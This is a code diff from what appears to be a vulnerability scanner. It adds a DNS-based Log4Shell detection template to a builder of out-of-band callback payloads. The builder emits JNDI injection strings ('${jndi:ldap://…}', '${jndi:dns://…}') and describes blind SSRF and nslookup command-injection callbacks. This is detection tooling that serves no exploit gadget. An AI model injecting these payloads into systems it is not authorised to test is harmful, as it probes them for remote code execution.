@@ -56,15 +56,21 @@ class OOBTemplateId(StrEnum):
     * ``BLIND_SSRF_URL`` — a bare ``http://`` callback URL for an ``EGRESS_FETCH``
       fetcher (blind SSRF). The first and only class exercised by this build.
     * ``JNDI_LDAP`` — a ``${jndi:ldap://…}`` lookup for a log-sink egress
-      (Log4Shell-class). Present so the carrier is class-generic; the log-sink
-      reachability channel it needs is a **separate, unbuilt** co-requisite
-      (§P6.5.3), so it is not wired to a methodology here.
+      (Log4Shell). The canonical shape; used when the collaborator is reachable via
+      a delegated wildcard zone (SUBDOMAIN) so the target's LDAP resolution of
+      ``<nonce>.<zone>`` calls back.
+    * ``JNDI_DNS`` — a ``${jndi:dns://…}`` lookup for a log-sink egress (Log4Shell).
+      The JNDI DNS provider queries the nonce as a domain **directly** at the
+      collaborator's DNS-leg authority (``host:dns_port``), so it confirms without
+      wildcard-DNS delegation or port-53 — the reliable docker-mode channel wired to
+      ``_test_log4shell`` (design §P6.5.4: the DNS leg confirms Log4Shell).
     * ``DNS_LOOKUP`` — a bare callback host for a DNS-only egress (blind CMDi
-      ``nslookup``). Also present for genericity, not wired this build.
+      ``nslookup``). Present for genericity, not wired this build.
     """
 
     BLIND_SSRF_URL = "blind_ssrf_url"
     JNDI_LDAP = "jndi_ldap"
+    JNDI_DNS = "jndi_dns"
     DNS_LOOKUP = "dns_lookup"
 
 
@@ -165,6 +171,12 @@ def build_oob_payload(
         # JNDI carries the nonce in the host (and path for the PATH shape) — the
         # lookup egress is the confirmation; Clinkz never serves a gadget (§P6.5.4).
         return f"${{jndi:ldap://{host}{path_nonce}/x}}"
+    if template_id is OOBTemplateId.JNDI_DNS:
+        # A dns:// JNDI lookup: the DNS provider queries the nonce-bearing name at the
+        # collaborator's DNS-leg authority directly (PATH: ``dns://<zone>/<nonce>``),
+        # so the nonce reaches the DNS leg with no wildcard delegation. The lookup
+        # egress is the confirmation; Clinkz serves no gadget (guardrail 2).
+        return f"${{jndi:dns://{host}{path_nonce}}}"
     if template_id is OOBTemplateId.DNS_LOOKUP:
         # A bare host for a DNS-only egress (e.g. ``nslookup <host>``). The PATH
         # shape has no path leg for DNS, so the nonce must ride the subdomain — a
